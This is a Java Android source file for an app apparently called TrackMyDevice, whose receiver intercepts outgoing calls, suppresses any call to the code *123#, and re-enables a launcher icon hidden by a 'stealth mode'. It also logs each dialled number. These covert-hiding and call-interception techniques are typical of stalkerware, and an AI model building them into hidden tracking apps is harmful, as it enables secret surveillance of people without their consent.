package com.trackmydevice;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;
import android.widget.Toast;

/**
 * Detects when user dials *123# to unhide the app.
 * Also responds to SECRET_CODE broadcast.
 */
public class DialCodeReceiver extends BroadcastReceiver {

    private static final String TAG = "DialCodeReceiver";
    private static final String SECRET_CODE = "123";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received action: " + action);

        if (Intent.ACTION_NEW_OUTGOING_CALL.equals(action)) {
            String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.d(TAG, "Outgoing call to: " + number);

            if (number != null && number.contains("*" + SECRET_CODE + "#")) {
                // Abort the call
                setResultData(null);
                abortBroadcast();

                // Unhide the app
                unhideApp(context);
            }
        }
    }

    private void unhideApp(Context context) {
        try {
            // Re-enable launcher
            ComponentName launcher = new ComponentName(context,
                    context.getPackageName() + ".MainActivity");
            context.getPackageManager().setComponentEnabledSetting(
                launcher,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );

            // Re-enable StartActivity
            try {
                ComponentName start = new ComponentName(context,
                        context.getPackageName() + ".StartActivity");
                context.getPackageManager().setComponentEnabledSetting(
                    start,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                );
            } catch (Exception ignored) {}

            // Save state
            context.getSharedPreferences("DeviceInfo", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("stealth_mode", false)
                    .apply();

            // Launch the app
            Intent launchIntent = new Intent(context, MainActivity.class);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            context.startActivity(launchIntent);

            Toast.makeText(context, "TrackMyDevice revealed!", Toast.LENGTH_LONG).show();
            Log.d(TAG, "App unhidden via dial code *123#");
        } catch (Exception e) {
            Log.e(TAG, "Failed to unhide app", e);
        }
    }
}
